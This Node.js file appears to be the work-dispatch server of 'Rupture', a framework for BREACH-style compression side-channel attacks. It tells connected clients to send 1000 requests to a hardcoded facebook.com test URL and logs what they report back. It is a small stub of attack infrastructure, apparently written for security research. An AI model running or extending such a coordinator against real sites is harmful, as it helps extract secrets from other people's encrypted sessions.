const io = require('socket.io'),
      winston = require('winston');

winston.remove(winston.transports.Console);
winston.add(winston.transports.Console, {'timestamp': true});

const PORT = 3031;

winston.info('Rupture real-time service starting');
winston.info('Listening on port ' + PORT);

var socket = io.listen(PORT);

socket.on('connection', function(client) {
    winston.info('New connection from client ' + client.id);

    client.on('get-work', function() {
        winston.info('get-work from client ' + client.id);
        client.emit('do-work', {
            url: 'https://facebook.com/?breach-test',
            amount: 1000,
            timeout: 0
        });
    });
    client.on('work-completed', function({work, success, host}) {
        winston.info('Client indicates work completed: ', work, success, host);
    });
    client.on('disconnect', function() {
        winston.info('Client ' + client.id + ' disconnected');
    });
});
